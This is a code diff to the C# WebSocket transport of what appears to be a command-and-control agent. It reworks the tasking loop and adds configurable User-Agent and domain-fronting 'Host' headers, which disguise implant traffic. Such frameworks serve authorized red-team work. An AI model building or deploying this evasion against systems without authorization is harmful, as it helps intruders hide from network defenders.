@@ -138,16 +138,40 @@ namespace WebsocketTransport
 
             agentProcessorTask.Start();
             agentPingTask.Start();
-            agentPingTask.Wait(cancellationTokenSource.Token);
 
-            while (Agent.IsAlive() && Agent.IsAlive())
+
+            agentConsumerTask = new ST.Task(() =>
             {
-                Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage tm)
+                while (Client.IsAlive && Agent.IsAlive())
                 {
-                    AddToSenderQueue(tm);
-                    return true;
-                });
-                Agent.Sleep();
+                    if (Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage tm)
+                    {
+                        if (Client.IsAlive)
+                        {
+                            AddToSenderQueue(tm);
+                            return true;
+                        } else
+                        {
+                            return false;
+                        }
+                    }))
+                    {
+                        Agent.Sleep();
+                    } else
+                    {
+                        cancellationTokenSource.Cancel();
+                    }
+                }
+            }, cancellationTokenSource.Token);
+
+            agentConsumerTask.Start();
+            try
+            {
+                agentConsumerTask.Wait(cancellationTokenSource.Token);
+            }
+            catch (OperationCanceledException)
+            {
+                return;
             }
         }
         private void Push()
@@ -208,7 +232,7 @@ namespace WebsocketTransport
 
         public void Start()
         {
-            DebugPrint("Started agent.");
+            DebugPrint("Started agent with tasking type: "+TaskingType);
             if (TaskingType == "Poll")
             {
                 Poll();
@@ -269,13 +293,22 @@ namespace WebsocketTransport
             Client = new WebSocket(Endpoint + PostUri);
             Client.WaitTime = TimeSpan.FromHours(8);
 
+            List<KeyValuePair<string,string>> headers = new List<KeyValuePair<string, string>>();
             if (TaskingType == "Push")
             {
-                Client.CustomHeaders = new List<KeyValuePair<string, string>>
-                {
-                    new KeyValuePair<string, string>("Accept-Type", "Push")
-                };
+                headers.Add(new KeyValuePair<string, string>("Accept-Type", "Push"));
             }
+
+            if (UserAgent != null && UserAgent != "")
+            {
+                headers.Add(new KeyValuePair<string, string>("User-Agent", UserAgent));
+            }
+            if (DomainFront != null && DomainFront != "")
+            {
+                headers.Add(new KeyValuePair<string, string>("Host", DomainFront));
+            }
+
+            Client.CustomHeaders = headers;
 
             IWebProxy proxy = WebRequest.GetSystemWebProxy();
 
